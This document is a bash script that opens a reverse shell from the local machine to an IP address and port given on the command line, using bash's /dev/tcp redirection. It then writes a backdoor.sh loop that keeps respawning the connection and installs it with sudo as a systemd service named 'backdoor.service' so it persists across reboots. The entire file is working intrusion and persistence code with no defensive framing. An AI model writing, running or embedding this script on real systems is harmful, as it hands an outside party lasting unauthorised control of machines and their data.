#!/bin/bash

# script to establish and maintain a reverse shell connection

# retrieve IP address and port from command line options
while getopts ":I:P:" opt; do
  case $opt in
    I) IP_ADDRESS="$OPTARG"
    ;;
    P) PORT="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    exit 1
    ;;
  esac
done

echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."

# attempt to establish initial reverse shell connection
bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &

# wait for a moment to allow the shell to establish
sleep 1

# check if the initial reverse shell connection is established
if ps | grep $! > /dev/null; then
    echo "Shell established!"
else
    echo "Failed to establish shell."
fi

# create and write to backdoor.sh
cat << EOF > backdoor.sh
#!/bin/bash

# continuously check and maintain the reverse shell connection
while true; do
    # check if bash -i process is running
    if ! ps aux | grep -v grep | grep "bash -i" > /dev/null; then
        # If not running, start the reverse shell
        bash -i >& /dev/tcp/$1/$2 0>&1 &
        sleep 1
    else
        # if running, wait for a second and check again
        sleep 1
    fi
done
EOF

# make backdoor script executable
chmod +x backdoor.sh


# add backdoor to systemd service for persistence

# path to backdoor.sh
BACKDOOR_PATH=$(pwd)/backdoor.sh

# create systemd service file
cat << EOF | sudo tee /etc/systemd/system/backdoor.service
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=$BACKDOOR_PATH $IP_ADDRESS $PORT
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# enable and start service
sudo systemctl enable backdoor.service
sudo systemctl start backdoor.service
